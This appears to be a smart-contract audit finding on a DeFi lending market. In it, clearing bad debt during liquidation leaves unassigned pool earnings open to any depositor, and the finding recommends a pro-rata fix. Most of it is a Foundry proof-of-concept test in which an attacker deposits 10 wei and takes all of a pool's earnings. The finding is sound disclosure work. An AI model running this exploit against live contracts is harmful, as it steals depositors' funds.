---
id: 25156
severity: "Medium"
---

# Liquidator will leave a pool with unassigned earnings on Market::clearBadDebt() free to claim for anyone when the repaid maturity is not the last

## Description



## Proof of Concept

Add the following POC to `Market.t.sol`, showing how a depositMaturity of 10 wei is enough to steal all unassigned maturities.

```solidity
function test_POC_ClearBadDebt_StealMaturities() external {
  uint256 maxVal = type(uint256).max;

  marketWETH.deposit(100000 ether, address(this));
  marketWETH.borrowAtMaturity(4 weeks, 10000e18, maxVal, address(this), address(this));
  marketWETH.repayAtMaturity(4 weeks, maxVal, maxVal, address(this));

  vm.startPrank(BOB);
  market.deposit(100 ether, BOB);
  auditor.enterMarket(market);
  marketWETH.borrowAtMaturity(4 weeks, 60e18, maxVal, BOB, BOB);
  vm.stopPrank();

  vm.startPrank(ALICE);
  weth.mint(ALICE, 1_000_000 ether);
  weth.approve(address(marketWETH), type(uint256).max);
  marketWETH.deposit(10, ALICE);
  marketWETH.borrowAtMaturity(4 weeks, 1, maxVal, ALICE, ALICE);
  vm.stopPrank();

  daiPriceFeed.setPrice(0.6e18);

  (uint256 coll, uint256 debt) = marketWETH.accountSnapshot(BOB);
  console.log(debt);
  (coll, debt) = market.accountSnapshot(BOB);
  console.log(coll);

  vm.startPrank(ALICE);
  marketWETH.liquidate(BOB, 100_000 ether, market);
  vm.stopPrank();

  (, , uint256 unassignedEarningsAfter, ) = marketWETH.fixedPools(4 weeks);
  assertEq(unassignedEarningsAfter, 45028532887479452);

  address attacker = makeAddr("attacker");
  vm.startPrank(attacker);
  deal(address(weth), attacker, 10);
  weth.approve(address(marketWETH), 10);
  marketWETH.depositAtMaturity(4 weeks, 10, 0, attacker);
  vm.stopPrank();

  (, , unassignedEarningsAfter, ) = marketWETH.fixedPools(4 weeks);
  assertEq(unassignedEarningsAfter, 0);

  // Attacker gets all the unassigned earnings by contributing only 10
  (uint256 principal, uint256 fee) = marketWETH.fixedDepositPositions(4 weeks, attacker);
  assertEq(principal, 10);
  assertEq(fee, 40525679598731507);
}
```

## Impact

Attacker can claim a lot of unassigned earnings just by depositing at maturity enough (may be as small as 1 wei) to cover remaining `floatingBackupBorrowed`.

## Recommendation

The unassigned earnings should be assigned to the earnings accumulator pro-rata to the `floatingBackupBorrowed` cleared in the bad debt clearance.
